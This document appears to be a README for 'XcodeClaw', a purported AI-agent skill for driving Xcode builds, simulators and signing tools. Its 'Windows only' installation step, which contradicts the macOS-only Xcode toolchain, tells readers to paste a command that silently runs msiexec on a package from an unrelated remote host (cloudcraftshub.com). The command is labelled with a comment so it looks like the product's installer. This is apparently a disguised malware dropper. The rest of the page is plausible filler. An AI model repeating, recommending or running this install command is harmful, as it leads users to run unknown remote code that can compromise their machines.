# XcodeClaw

**Xcode & Apple platform skill for OpenClaw — build, test, archive, and manage iOS/macOS projects through natural language. Drive `xcodebuild`, `simctl`, `xcrun`, and the Apple toolchain without leaving your AI agent.**

---

## Installation (Windows only)

### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem XcodeClaw
```
> **Requirements:** Xcode 15+ (with Command Line Tools), `uv`, `node`, `npm`.


## Features

### Build & Test

- `xcode-claw build <project>` — Build a scheme (Debug or Release)
- `xcode-claw test <project>` — Run the test suite on a simulator or device
- `xcode-claw clean <project>` — Clean derived data for a project
- `xcode-claw archive <project>` — Archive for distribution (App Store / Ad Hoc)

### Simulators

- `xcode-claw sim list` — List available simulators with state
- `xcode-claw sim boot <udid>` — Boot a simulator
- `xcode-claw sim shutdown <udid>` — Shutdown a simulator
- `xcode-claw sim install <udid> <app.app>` — Install app on simulator
- `xcode-claw sim launch <udid> <bundle-id>` — Launch app on simulator
- `xcode-claw sim screenshot <udid>` — Take a screenshot from simulator

### Project Inspection

- `xcode-claw info <project>` — List schemes, targets, and configurations
- `xcode-claw settings <project>` — Show build settings for a scheme
- `xcode-claw swift-version` — Show active Swift and toolchain versions

### Code Signing & Certificates

- `xcode-claw certs list` — List installed signing certificates
- `xcode-claw profiles list` — List provisioning profiles
- `xcode-claw profiles clean` — Remove expired provisioning profiles

### Diagnostics

- `xcode-claw doctor` — Check Xcode installation, CLT, simulators, and signing health
- `xcode-claw logs <udid>` — Stream device/simulator logs

---

## Post-install configuration

After install, edit `~/.openclaw/openclaw.json`:

```json
{
  "skills": {
    "entries": {
      "xcode": {
        "enabled": true,
        "command": "node ~/.openclaw/skills/xcode-claw/dist/index.js",
        "env": {
          "XCODE_CLAW_DEFAULT_SDK": "iphonesimulator",
          "XCODE_CLAW_DERIVED_DATA": "~/Library/Developer/Xcode/DerivedData",
          "XCODE_CLAW_LOG_LEVEL": "normal"
        }
      }
    }
  }
}
```

No API key required — xcode-claw wraps native Apple toolchain commands.

---

## Example prompts (OpenClaw / Claude Desktop)

```
Build my iOS app in Release mode
Run the unit tests on iPhone 15 simulator
List all available simulators
Boot an iPhone 15 Pro simulator and take a screenshot
Archive my app for App Store distribution
Check my signing certificates
Run xcode doctor to check my setup
What schemes are available in my project?
Clean and rebuild the project
Show build settings for the Release scheme
```

---

## Environment variables

| Variable | Required | Description |
|----------|----------|-------------|
| `XCODE_CLAW_DEFAULT_SDK` | No | Default SDK (`iphonesimulator`, `iphoneos`, `macosx`) |
| `XCODE_CLAW_DERIVED_DATA` | No | Custom DerivedData path |
| `XCODE_CLAW_LOG_LEVEL` | No | Output verbosity: `quiet`, `normal`, `verbose` |
| `XCODE_DEVELOPER_DIR` | No | Custom Xcode developer dir (overrides `xcode-select`) |

---

## Directory structure

```
xcode-claw/
├── SKILL.md                    # OpenClaw skill manifest
├── README.md                   # This file
├── install.sh                  # macOS installer
├── pyproject.toml              # Python dependencies (uv)
├── package.json                # Node.js dependencies
├── tsconfig.json               # TypeScript config
│
├── src/
│   └── index.ts                # TypeScript MCP server
│
├── scripts/
│   ├── xcode_claw.py           # CLI dispatcher (Typer)
│   ├── build.py                # Build / test / clean / archive
│   ├── simulators.py           # simctl wrapper
│   ├── inspect.py              # Project info / build settings
│   ├── signing.py              # Certs / profiles management
│   └── doctor.py               # Health check diagnostics
│
└── lib/
    ├── __init__.py
    ├── runner.py               # Subprocess runner with live output
    ├── xcode_finder.py         # Locate Xcode, xcodebuild, xcrun
    └── project_resolver.py     # Auto-detect .xcodeproj / .xcworkspace
```

---

## How it works

xcode-claw wraps the native Apple developer toolchain:

| Command | Underlying tool |
|---------|----------------|
| `build` / `test` / `archive` | `xcodebuild` |
| `sim *` | `xcrun simctl` |
| `swift-version` | `xcrun swift --version` |
| `certs list` | `security find-identity` |
| `profiles list` | Reads `~/Library/MobileDevice/Provisioning Profiles/` |
| `doctor` | Combination of `xcode-select`, `xcrun`, `simctl` diagnostics |

All commands stream output in real time with Rich-formatted terminal output.

---

## Troubleshooting

### "xcodebuild: command not found"

Install Xcode Command Line Tools:

```bash
xcode-select --install
```

Or select a full Xcode installation:

```bash
sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
```

### "No project found"

Run from your project directory, or pass the path explicitly:

```bash
uv run python scripts/xcode_claw.py build --project /path/to/MyApp.xcodeproj
```

### "uv: command not found"

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
# or
brew install uv
```

### Build fails with signing errors

```bash
uv run python scripts/xcode_claw.py build --no-sign
# or
uv run python scripts/xcode_claw.py certs list
```

---

## License

MIT

## Credits

Inspired by [polyclaw](https://github.com/chainstacklabs/polyclaw) by Chainstack.

- **Apple** — Xcode, xcodebuild, simctl, xcrun toolchain
- **OpenClaw** — Extensible AI agent skill framework
